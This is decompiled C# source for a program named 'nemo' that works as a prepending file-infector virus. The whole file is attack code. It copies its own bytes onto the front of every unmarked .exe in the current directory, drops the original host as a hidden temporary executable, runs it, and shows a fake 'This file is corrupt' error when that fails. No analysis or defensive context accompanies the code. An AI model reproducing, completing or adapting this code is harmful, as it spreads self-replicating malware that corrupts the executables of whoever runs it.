using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace nemo;

[StandardModule]
internal sealed class Module1
{
	public static void Replicate()
	{
		//IL_02ab: Unknown result type (might be due to invalid IL or missing references)
		Random random = new Random();
		string text = Conversions.ToString(random.Next(1, 1000)) + ".exe";
		object obj = Convert.ToString(Process.GetCurrentProcess().MainModule!.FileName);
		string currentDirectory = Environment.CurrentDirectory;
		FileStream fileStream = new FileStream(Conversions.ToString(obj), FileMode.Open, FileAccess.Read);
		BinaryReader binaryReader = new BinaryReader(fileStream);
		checked
		{
			byte[] array = new byte[(int)fileStream.Length + 1];
			int num = 0;
			int num2 = (int)(binaryReader.BaseStream.Length - 1L);
			num = 0;
			while (true)
			{
				int num3 = num;
				int num4 = num2;
				if (num3 > num4)
				{
					break;
				}
				array[num] = binaryReader.ReadByte();
				num++;
			}
			fileStream.Close();
			binaryReader.Close();
			string[] files = Directory.GetFiles(currentDirectory, "*.exe");
			int num5 = 0;
			int num6 = files.Length - 1;
			num5 = 0;
			while (true)
			{
				int num7 = num5;
				int num4 = num6;
				if (num7 > num4)
				{
					break;
				}
				FileStream fileStream2 = new FileStream(files[num5], FileMode.Open, FileAccess.Read);
				BinaryReader binaryReader2 = new BinaryReader(fileStream2);
				byte[] array2 = new byte[(int)fileStream2.Length + 1];
				int num8 = 0;
				int num9 = (int)(binaryReader2.BaseStream.Length - 1L);
				num8 = 0;
				while (true)
				{
					int num10 = num8;
					num4 = num9;
					if (num10 > num4)
					{
						break;
					}
					array2[num8] = binaryReader2.ReadByte();
					num8++;
				}
				fileStream2.Close();
				binaryReader2.Close();
				if (array2[60] != 128)
				{
					Console.WriteLine("File to infect:" + files[num5]);
					FileStream fileStream3 = new FileStream(files[num5], FileMode.Open, FileAccess.Write);
					BinaryWriter binaryWriter = new BinaryWriter(fileStream3);
					int num11 = 0;
					int num12 = array.Length - 1;
					num11 = 0;
					while (true)
					{
						int num13 = num11;
						num4 = num12;
						if (num13 > num4)
						{
							break;
						}
						binaryWriter.BaseStream.WriteByte(array[num11]);
						num11++;
					}
					int num14 = 0;
					int num15 = array2.Length - 1;
					num14 = 0;
					while (true)
					{
						int num16 = num14;
						num4 = num15;
						if (num16 > num4)
						{
							break;
						}
						binaryWriter.BaseStream.WriteByte(array2[num14]);
						num14++;
					}
					binaryWriter.Close();
					fileStream3.Close();
				}
				num5++;
			}
			FileInfo fileInfo = new FileInfo(Conversions.ToString(obj));
			int num17 = default(int);
			num17 = (int)(fileInfo.Length - 28673L);
			if (num17 <= 0)
			{
				return;
			}
			if (File.Exists(text))
			{
				File.Delete(text);
			}
			FileStream fileStream4 = new FileStream(text, FileMode.CreateNew);
			File.SetAttributes(text, FileAttributes.Hidden);
			int num18 = (int)fileInfo.Length;
			int num19 = 28673;
			while (true)
			{
				int num20 = num19;
				int num4 = num18;
				if (num20 > num4)
				{
					break;
				}
				fileStream4.WriteByte(array[num19]);
				num19++;
			}
			fileStream4.Close();
			try
			{
				Process.Start(text).WaitForExit();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				MessageBox.Show("This file is corrupt", "Windows", (MessageBoxButtons)0, (MessageBoxIcon)16);
				ProjectData.ClearProjectError();
			}
			File.Delete(text);
		}
	}

	[STAThread]
	public static void Main()
	{
		Replicate();
	}
}
